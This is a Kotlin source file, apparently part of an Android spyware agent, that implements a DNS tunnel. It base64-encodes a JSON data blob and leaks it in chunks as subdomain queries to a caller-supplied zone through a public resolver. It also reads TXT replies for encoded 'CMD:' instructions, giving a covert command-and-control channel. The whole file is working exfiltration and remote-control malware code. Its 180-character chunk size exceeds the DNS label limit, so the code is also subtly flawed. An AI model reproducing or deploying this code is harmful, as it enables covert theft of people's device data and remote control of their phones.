package com.pegasus.agent

import android.util.Base64
import org.json.JSONObject
import org.xbill.DNS.DClass
import org.xbill.DNS.Message
import org.xbill.DNS.Name
import org.xbill.DNS.Record
import org.xbill.DNS.Type
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress

object DnsTunnel {
    private const val MAX_LABEL = 180

    fun exfil(zone: String, blob: JSONObject): JSONObject? {
        val b64 = Base64.encodeToString(blob.toString().toByteArray(),
            Base64.URL_SAFE or Base64.NO_WRAP)
        b64.chunked(MAX_LABEL).forEachIndexed { i, chunk ->
            val reply = query("$i.${blob.optString("dna")}.$zone")
            if (reply.startsWith("CMD:")) {
                val cmd = String(Base64.decode(reply.removePrefix("CMD:"), Base64.URL_SAFE))
                return JSONObject().put("command", cmd)
            }
        }
        return JSONObject().put("acked", true)
    }

    private fun query(name: String): String = runCatching {
        val req = Message.newQuery(Record.newRecord(Name.fromString("$name."), Type.TXT,
            DClass.IN))
        DatagramSocket().use { sock ->
            sock.soTimeout = 5000
            sock.send(DatagramPacket(req.toWire(), req.toWire().size,
                InetAddress.getByName("8.8.8.8"), 53))
            val buf = ByteArray(2048)
            val pkt = DatagramPacket(buf, buf.size)
            sock.receive(pkt)
            Message(pkt.data).getSection(org.xbill.DNS.Section.ANSWER)
                .filterIsInstance<org.xbill.DNS.TXTRecord>()
                .joinToString("") { it.strings.joinToString("") }
        }
    }.getOrDefault("")
}
